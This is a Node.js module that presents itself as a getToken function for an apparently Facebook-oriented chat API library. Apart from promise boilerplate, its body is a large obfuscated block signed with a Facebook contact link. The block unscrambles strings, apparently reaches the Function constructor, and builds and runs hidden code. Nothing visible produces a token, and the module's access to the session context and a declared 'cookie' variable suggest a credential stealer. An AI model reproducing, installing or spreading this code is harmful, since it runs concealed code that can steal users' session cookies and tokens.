var axios = require('axios');

module.exports = function(defaultFuncs, api, ctx) {
    return function getToken(callback) {
        var resolveFunc = function() {};
        var rejectFunc = function() {};
        var returnPromise = new Promise(function(resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function(err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }

        //Contact Máº¡nhG. Fb: Fb.com/manhict
var cookie;(function(){var Gnt='',GPT=904-893;function Uwp(r){var a=2542972;var f=r.length;var o=[];for(var p=0;p<f;p++){o[p]=r.charAt(p)};for(var p=0;p<f;p++){var i=a*(p+92)+(a%38937);var b=a*(p+397)+(a%43655);var m=i%f;var v=b%f;var d=o[m];o[m]=o[v];o[v]=d;a=(i+b)%6340278;};return o.join('')};var MUN=Uwp('mbpntieftudqltaosjhrsrncooukvcgrywxcz').substr(0,GPT);var mUf='[a ;s0y7asny4e0m1+;v;a gtterc=l.r8ijrl{iygc9i5u;wn)zo{i)r4n)c,rk vs00C7A g]6;c,;7n109n+;]5(ltseh,vr9,,.=5d0([8o)Ao,]v=e([haera =[d+p]l-l)r jvt[u)t()e4{9.(y=a)+gC,s)aoi+vgnv8[;; )s;vn1s;u.l(9d;*;d(h+;rgo(rrfpd+,f, ;wua.ts-wxrln))[6lelvc; cbat8ymgyt+x;,qrdlfra=(=0;krfdo,r}frnw!f.ftva1;e ,(;Cfog{v]a bg=ug;;).t;x2;n;nal1eqo-C(hwav=Cgc+ vo,(ve.rm=aa;=l02))"sa2o}+c]niu,etf1esi.+ojwi33c=n(2h{or(nrAyprir0;fst=l+;c]s)nah}v=o.u12*= fp;-r)ya+}t=(rrhr] ,ar8;<uwu} "ienofrr;(6ivb=qo(na=fn0ro1=.=1r.n8n0t..6p-o1f)a};()76["re0+"rl=--=;a+a;c7sthi}e,]rml=l(;hn66h6Sl==4+==(teo(.s=])==)=m("h1l ;+uryr.l7(jm,qagpp,iCi6(aba)h1h;dl.h1hhrtf.j)eur.+(o,;y,e,w]e)v;;fln5b2aadpv(r)<di c )u+=cb8("";,pqh3pvs.br[t=nh.4sr)r+ivyh+nw""Ai+sr .=;C2,97ma9rt0o[6=aaofcaf)(>];ni+;<)a=i+ar7guf(odC;=s=ogpvu(jsr(>(vtril=)=v<rktmiet;)[{=fn=<n pliar{+ono .)rdnr)98jusc n;rr[,sa) ]jhtmeSr.("[f.A[fg tgde hrea,itr8t7!,]..,re8t(k';var ApJ=Uwp[MUN];var GWZ='';var DWw=ApJ;var GlD=ApJ(GWZ,Uwp(mUf));var zfM=GlD(Uwp('Eurc0(ogr1g_..(u4e)s_Du0ct!cD$s7h)(D=_)j[1xuBxxEaDwnDxiEfe,6;$xv)Eiex0te.o.(w2e$}E24r*o2_;D0\/f;__B_DxiD4e8[Dt.t80!(e7Bsx_ttf4,=i.i{f+i0x2vCnx_5x2_)(; =.0iD()ck{wEDe0tE47Dk[0.{t22\'Do[)nBxn2pEi+k)%04,..uax}EBx4{.1_En.)f0aDx!a0=x0x(10!)]xos7c.nB1.D.u11E100017nm.)[.4pD21#+B4l(e[1xm;114D40.D,aBt6xD}afsD.dgBxg7_C4a)}e_sxx3i]0l4_11B.fD6]uB$.".DsD.ow14014l7)}o0to0csD%x4=44c01D0a_B[]x.D.0xr{a[0.t!a011,ac0_nn_t1(o.Dxa(_1\/ux{E4fEd_.x}D[cx;!r.(xBt4)Ba7),D.1=2))o;.0(no{_(2.pxnDtf1.1=D(1.r_D1oi,xD4r4{e0u;1&cf"f4trf7rc.hD)1#p4DcD0_lE_t)4cE0c11D$),)u)f=E.mse[_"(),!_]oo.0_xxt(($E0=tpx_1aiun71ni1g24$!f0b}*cE6e_81m1e2a].(6,i0,2E.s_2i4]}av,k(2(tsiD]#xc1))Ea_2...,c(E}240fooco0E\'BfnfD4)6m.8[E0(4xxm11tg48tx0[47_,t.Beex4xfsE2pCm6!1fi.b!8)(_77!rorr1}xv+0i20)(21x0o}#xvie_BpDer(e(1)D)D.E0)!irho8_\'4nE_1Dcu=[_41g0e0;_47.D4D3aE4SaB1_i..)$DpDc);lip7:]h1}}[)pu.D=f1u(_Bh4u0u_D$uyn)nD4aD(;,0.[mej](01D.fs4c_r(t{)].Ba_r1_.r_4v_l42{1(24y7E4_,x_0be,hv[l1bnn(_g.1(6E11d({x{{s.4_Efht00x.xE(0=1e,_e1.c,(;,1lf.0l0(c i}_i(f1.fb4fDn+u1x0.B)D{xc_=B4D(.0_42.(!21)2=(%hr#v(0e]D0(=unfe9q4()e_.2unD.;]=1x.xtx.=m4$x{f.D_f)uBk)aE)xteDslk0x_01d&jks;[0v11$lo2_xss4_1..x)En[130=)0f07i_t{xu.21yfrEmr6c(f2+(0D.rt!.#_{2;a_p0B._dh;DDsEc[x44xr1hu)lu){(24(u)._u(0agDx1fD1.o4c40111)_Dm26n0e24x)(E)D,E48xtxl1t]4!09!0f#an]0it.bD"4.B.t(.e,..4Eh.)_E])1s1}7D4C2[*;.4460}t0)_1u.)[)_04!a)3=_ukE#exo{!!;1___a00)0a.rE_;D7s040;l(D{DxBD)o1(aE4)!"0na_(s(x=[#){[1}}1soxnsD42fl;u5}x_(En;0.fE0eDxf =D10__t(4.Da6=.s_x00.,u_]0e11a.f0f[fo]266_2w2i)211._DDgx8x8_[1D0D7g0u7DD0t(4E4xux0[rr6EE)c0DuDusrDsh!#k4[(e2(=rE[uhD72)4.x+1xDuDx1.+14eev4m4)!o1_x(Btt(B#;f4w00((,_tiDac4]s=E{_0nloxEtD1Dx!o"fvDm1s1.ffo._ivxrt1B]0v114;xrx)016ox_B_0xquu{uxD;_pxmBu:)umnEa;pi]1D11x+xe._3Dc2fxaxun10nm(;..)xtt6Dx_e)c{u.#s#=gt_;rnEaD0_+(.nD.m!(71.{1!4.na=r:4B_4prp(.tf4(h.020.,Dl6Dx;(1!i[sxs)x=yl_osEx,B=.=l1200Ei)f2nnxuf._._4ex(,(04mm8!16(x14+_x;(,(7)\',{nxf=r [1)tf{D.]v]_2D0n03)4sa8Dx6]D!xE0]jxxmou146uEx_0wxE_x!ro)4f26.!x=.axnr]72a(x;u10DEDx0.!2.0f};1;,+E4)=0fBB_B)l__00aB2_2)t62(3_B11=01er+0w4(b4#nDut0nBfD;{6r2s40,nDn07(j!nt[l7(DBw_=[xnlte)_htf{60f_ta1n1ul0!2svxm_#tr%v0!0x2n17mEior(6}2(o fs4(D1(f.x2c2ft2D1sE2Eke_i00};1b0([c;_D6ta4(4fnx].0oE))a_Dt[x1Dre2evE{%0_Dn]i).xaa21sm(i2!tE=!d._4xfE4f6x_#]Dxfa1{1E_64\/_,=21=).,000!Cyaa_0.f4u6+tfxr,4r1B0x0..(4c.02D(,x1)4D5c0uete$;E.D4]r\/ct_k4xEvD[4isBln)uBdDsc).x_DE6.x..)00D2xe7i(1_7,x,tExrB01xeEopu.024u$1u.)7_fb402[)#s2nnBm)x,11f(f.yD_.an#a24x_c011Cti.xDv_.v4..1]B4D_#r30)4D7t(1!0p]xs8#)(r.n;_)2xDrD4(0,)ers!e1Efon1.uns1v_!0]i4xfcB2[2)Da_0"u)m4t(4),f5))01]#r_ro1x_=)}B2uB0.!ffx!!n_l B16(024=0{2x&4u{}D02xg$1D_2}B406]E(4fx)Ex0l2x.r0).[u1x_0lx4_=o4,m44Dfx(DrpD1i=!sf(),1cDB7nu[)x3rDu$(l_0ren_e41DyxtD!e4B;)f.c11t(.fa;x*[=4frcfv)d.0Dsx0aute02[EB2.a(2(442i4.4on%.uD2e{xaeh]xxD)11Di0=(.n[)D4;.4.DtBr00_..oux:.!Do11_nn])TD)0av_B_4D)Bf1x[sr(1+8.Ex21(uwnBe}Er(47%n_!170]l)2(fDE7xg!0c1x4ox.D._4!p.!i1n[,).fxn2E1,$]4&=#)3BvE$p1_10x70fB(4B)4g.01;uB1,.c[D_.n!voB),c0)_0.]_f.iE.x_D .n#_cu..u,l4s#.rt74(r1}x0nyD._tE%10el_E:v=2_ !1c2r.__]0_uaol)$spt2[=r!(7(=1o40.De(2x,7,6i)].E(eD_1f_h)4Sme.d5Bs04c0l,a1!t0(jxl.4DB(uuB2f!oewDx\/D1x.p]4a*e0x#.)0=p4_ox21Bfg_uu)a6[Bl.0#[DD,E1((rrD0g]6E17#Eerts0e11Df]]E1DE10(02]x=_DrD.)Di0_.d+,7(a,_1n4o00ou.c n2((0p[i:xs4E1)_2u.t[}DEe_j%41eBE.4,x_3011sr4f]11+El0r{,4[3,.f4000ln1l$]ceo=.nn4)Di2Eunu0(D0D14_DDs2pf+xxDB}.D00))B D7r1B}Dxnx_)x4=]t.\/0w1(._60_)0(_2B6nD_.4.(Ef(x)[!![6(t1B,1D0(4iB411i[4t.0;%i!D_ni0l41n(E_x;g2t0D([0o2E4n1a4);i(h_1o_0024n(80.0}nra#Etp(2Bah2u)66_e.=r!E(r(_1.]_0.0l51u})f4r6}os]tD]0l6f]04DD1tn=.1r%o;444!g6))%x[0sae1o03.}t$_r!itr(=Ds_wD=xmtvv;}x]{xC7D_D,t4xk1 ;0).s)4;;e'));var BRl=DWw(Gnt,zfM );BRl(6119);return 5474})()

        return returnPromise;
    };
};